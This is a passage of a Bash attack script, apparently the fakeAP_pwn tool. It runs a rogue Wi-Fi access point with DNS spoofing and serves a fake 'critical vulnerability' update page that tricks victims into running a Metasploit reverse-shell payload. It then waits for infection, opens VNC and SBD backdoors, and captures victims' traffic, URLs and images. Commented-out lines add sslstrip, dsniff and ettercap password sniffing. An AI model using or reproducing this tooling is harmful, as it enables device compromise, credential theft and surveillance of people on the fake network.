if [ -z "$(pgrep dhcpd3)" ] ; then # check if dhcpd3 server is running
   display error "DHCP server failed to start." $diagnostics 1>&2
   if [ "$verbose" == "2" ] ; then echo "Command: killall xterm"; fi; if [ "$diagnostics" == "true" ] ; then echo "killall xterm" >> fakeAP_pwn.log; fi
   cleanup
fi

#----------------------------------------------------------------------------------------------#
if [ "$apMode" != "normal" ] ; then
   display action "Starting: DNS" $diagnostics
   action "DNS" "dnsspoof -i $apInterface -f /tmp/fakeAP_pwn.dns" $verbose $diagnostics "true" $debug 10 165 5 & # Dont wait, do the next command
   sleep 2

#----------------------------------------------------------------------------------------------#
   display action "Starting: Metasploit" $diagnostics
   #if [ "$verbose" == "2" ] ; then echo "Command: /opt/metasploit3/bin/msfcli exploit/multi/handler PAYLOAD=linux/x86/metsvc_reverse_tcp_tcp LHOST=10.0.0.1 LPORT=4566 AutoRunScript=/tmp/fakeAP_pwn-osx.rb E"; fi
   #$xterm -geometry 75x15+10+215 -T "fakeAP_pwn v$version - Metasploit (Linux)" -e "/opt/metasploit3/bin/msfcli exploit/multi/handler PAYLOAD=linux/x86/metsvc_reverse_tcp_tcp LHOST=10.0.0.1 LPORT=4566 AutoRunScript=/tmp/fakeAP_pwn-osx.rb E" &
   #if [ "$verbose" == "2" ] ; then echo "Command: /opt/metasploit3/bin/msfcli exploit/multi/handler PAYLOAD=osx/x86/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4565 AutoRunScript=/tmp/fakeAP_pwn-linux.rb E"; fi
   #$xterm -geometry 75x15+10+215 -T "fakeAP_pwn v$version - Metasploit (OSX)" -e "/opt/metasploit3/bin/msfcli exploit/multi/handler PAYLOAD=osx/x86/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4565 AutoRunScript=/tmp/fakeAP_pwn-linux.rb E" &
   command=$(netstat -l -t -p | grep 4565)
   if [ "$command" != "" ] ; then display error "The port (4564) isn't free." $diagnostics 1>&2; cleanup; fi # Kill it for them?
   action "Metasploit (Windows)" "/opt/metasploit3/bin/msfcli exploit/multi/handler PAYLOAD=windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4564 AutoRunScript=/tmp/fakeAP_pwn.rb INTERFACE=$apInterface E" $verbose $diagnostics "true" $debug 10 255 15 & #ExitOnSession=false # Dont wait, do the next command
   sleep 5 # Need to wait for metasploit, so we have an exploit ready for the target to download...
   if [ -z "$(pgrep ruby)" ] ; then
      display error "Metaspliot failed to start." $diagnostics 1>&2
      if [ "$verbose" == "2" ] ; then echo "Command: killall xterm"; fi; if [ "$diagnostics" == "true" ] ; then echo "killall xterm" >> fakeAP_pwn.log; fi
      cleanup
   fi

#----------------------------------------------------------------------------------------------#
   display action "Starting: Web server" $diagnostics
   if [ ! -e /etc/ssl/private/ssl-cert-snakeoil.key ] ; then
      display error "Need to renew certificate" $diagnostics ;
      openssl genrsa -out server.key 1024
      openssl req -new -x509 -key server.key -out server.pem -days 1826
      mv server.key /etc/ssl/private/ssl-cert-snakeoil.key
      mv server.pem /etc/ssl/certs/ssl-cert-snakeoil.pem
   fi
   action "Web Sever" "/etc/init.d/apache2 start && ls /etc/apache2/sites-available/ | xargs a2dissite && a2ensite fakeAP_pwn && a2enmod ssl && a2enmod php5 && /etc/init.d/apache2 reload" $verbose $diagnostics "true" $debug & #dissable all sites and only enable the fakeAP_pwn one # Dont wait, do the next command
   sleep 2
   if [ -z "$(pgrep apache2)" ] ; then
      display error "Apache2 failed to start." $diagnostics 1>&2
      if [ "$verbose" == "2" ] ; then echo "Command: killall xterm"; fi ; if [ "$diagnostics" == "true" ] ; then echo "killall xterm" >> fakeAP_pwn.log; fi
      cleanup
   fi

if [ "$diagnostics" == "true" ] ; then
    sleep 3
    display diag "Testing: Web server" $diagnostics
    echo "-Testing Web server--------------------------------------------------------------------------" >> fakeAP_pwn.log
    command=$(wget -qO- 10.0.0.1 | grep "<h2>There has been a <u>critical vulnerability</u> discovered in your operating system</h2>")
    if [ "$command" != "" ] ; then
        echo "-->Web server: Okay" >> fakeAP_pwn.log
    else
        display error "Web server: Failed" $diagnostics 1>&2 ;
        echo "-->Web server: Failed" >> fakeAP_pwn.log
        echo "Output:" >> fakeAP_pwn.log
        wget -qO- http://10.0.0.1 >> fakeAP_pwn.log
    fi
fi

#----------------------------------------------------------------------------------------------#
   if [ "$payload" == "vnc" ] ; then
      display action "Getting the backdoor (VNC) ready..." $diagnostics
      action "VNC" "vncviewer -listen" $verbose $diagnostics "true" $debug 10 440 22 & # Dont wait, do the next command
   elif [ "$payload" == "sbd" ] ; then
      display action "Getting the backdoor (SBD) ready..." $diagnostics
      action "SBD" "sbd -l -k g0tmi1k -p $port" $verbose $diagnostics "true" $debug 10 440 22 & # Dont wait, do the next command
      sleep 1
   fi

#----------------------------------------------------------------------------------------------#
   if [ "$debug" == "true" ] || [ "$verbose" == "2" ] || [ "$diagnostics" == "true" ] ; then
      action "Connections" "watch -d -n 1 \"arp -n -v -i $apInterface\"" $verbose $diagnostics "true" $debug 10 475 5 & # Dont wait, do the next command
   fi
   display info "Waiting for target to run the \"update\"" $diagnostics # Wait till target is infected (It's checking for a file to be created by the metasploit script (fakeAP_pwn.rb))
   if [ -e /tmp/fakeAP_pwn.lock ] ; then rm -r /tmp/fakeAP_pwn.lock; fi
   while [ ! -e /tmp/fakeAP_pwn.lock ] ; do
      sleep 5
   done

#----------------------------------------------------------------------------------------------#
   display info "Target infected!" $diagnostics
   if [ "$diagnostics" == "true" ] ; then echo "-Target infected!------------------------" >> fakeAP_pwn.log; fi
   targetIP=$(arp -n -v -i $apInterface | grep $apInterface | awk -F " " '{print $1}')
   if [ "$verbose" != "0" ] ; then display info "Target's IP = $targetIP" $diagnostics ; fi; if [ "$diagnostics" == "true" ] ; then echo "Target's IP = $targetIP" >> fakeAP_pwn.log; fi

#----------------------------------------------------------------------------------------------#
   if [ "$apMode" == "transparent" ] ; then
      display action "Giving internet access..." $diagnostics
      iptables --flush       # Remove existing rules - Start fresh
      iptables --delete-chain
      iptables --zero
      echo 1 > /proc/sys/net/ipv4/ip_forward
      command=$(cat /proc/sys/net/ipv4/ip_forward)
      if [ $command != "1" ] ; then
        display error "Can't enable ip_forward" $diagnostics 1>&2
        cleanup
      fi
      iptables --table nat --append POSTROUTING --out-interface $interface --jump MASQUERADE
      iptables --append FORWARD --in-interface $apInterface --jump ACCEPT
      iptables --table nat --append PREROUTING --jump DNAT --to-destination $gatewayIP
      #iptables --table nat --append PREROUTING --proto udp --destination-port 53 --jump DNAT --to-destination $gatewayIP
      #iptables --table nat --append PREROUTING --proto tcp --destination-port 53 --jump DNAT --to-destination $gatewayIP
      iptables --append INPUT -m iprange --src-range 10.0.0.150-10.0.0.250 --in-interface $apInterface --to-destination $gatewayIP --proto all -j DROP  # Protect the gateway
   fi

#----------------------------------------------------------------------------------------------#
   if [ "$payload" == "wkv" ] ; then
      display action "Opening WiFi Keys..." $diagnostics
      action "Killing xterm" "killall xterm" $verbose $diagnostics "true" "true" 10 440 22 & # Don't close! We want to view this!
      sleep 1
   fi

#----------------------------------------------------------------------------------------------#
   elif [ "$apMode" == "normal" ] ; then
   if [ "$debug" == "true" ] || [ "$verbose" == "2" ] || [ "$diagnostics" == "true" ] ; then
      action "Connections" "watch -d -n 1 \"arp -n -v -i $apInterface\"" $verbose $diagnostics "true" $debug 10 475 5 & # Dont wait, do the next command
   fi
fi

#----------------------------------------------------------------------------------------------#
if [ "$extras" == "true" ] ; then
   display action "Caputuring infomation about the target..." $diagnostics
   action "tcpdump" "tcpdump -i $apInterface -w /tmp/fakeAP_pwn.cap" $verbose $diagnostics "true" $debug 650 640 10 & # Dump all trafic into a file # Dont wait, do the next command
   action "URLs" "urlsnarf -i $apInterface" $verbose $diagnostics "true" $debug 10 0 10 & # URLs # Dont wait, do the next command
   action "Images" "driftnet -i $apInterface" $verbose $diagnostics "true" $debug 10 465 10 & # Dont wait, do the next command
   #iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
   #command="sslstrip -k -f -l 10000 -w /tmp/fakeAP_pwn.ssl"
   #if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi; if [ "$diagnostics" == "true" ] ; then echo "$command" >> fakeAP_pwn.log; fi
   #$xterm -geometry 0x0+0+0 -T "fakeAP_pwn v$version - SSLStrip" -e "$command" &            # SSLStrip
   #command="dsniff -i $apInterface -w /tmp/fakeAP_pwn.dsniff"
   #if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi; if [ "$diagnostics" == "true" ] ; then echo "$command" >> fakeAP_pwn.log; fi
   #$xterm -geometry 75x10+10+155  -T "fakeAP_pwn v$version - Passwords" -e "$command" &     # Passwords
   #command="ettercap -T -q -p -i $apInterface // //"
   #if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi; if [ "$diagnostics" == "true" ] ; then echo "$command" >> fakeAP_pwn.log; fi
   #$xterm -geometry 75x10+460+155 -T "fakeAP_pwn v$version - Passwords (2)" -e "$command" & # Passwords (again)
   #command="msgsnarf -i $apInterface"
   #if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi; if [ "$diagnostics" == "true" ] ; then echo "$command" >> fakeAP_pwn.log; fi
   #$xterm -geometry 75x10+10+310  -T "fakeAP_pwn v$version - IM" -e "$command" &            # IM
   #command="imsniff $apInterface"
   #if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi; if [ "$diagnostics" == "true" ] ; then echo "$command" >> fakeAP_pwn.log; fi
   #$xterm -geometry 75x10+10+310  -T "fakeAP_pwn v$version - IM (2)" -e "$command" &        # IM (again)
fi

#----------------------------------------------------------------------------------------------#
if [ "$apMode" == "normal" ] ; then
   display info "Ready! ...press CTRL+C to stop" $diagnostics
   if [ "$diagnostics" == "true" ] ; then echo "-Ready!----------------------------------" >> fakeAP_pwn.log; fi
   for (( ; ; ))
   do
      sleep 1
   done
fi

#----------------------------------------------------------------------------------------------#
if [ "$diagnostics" == "true" ] ; then echo "-Done!---------------------------------------------------------------------------------------" >> fakeAP_pwn.log ; fi
cleanup clean
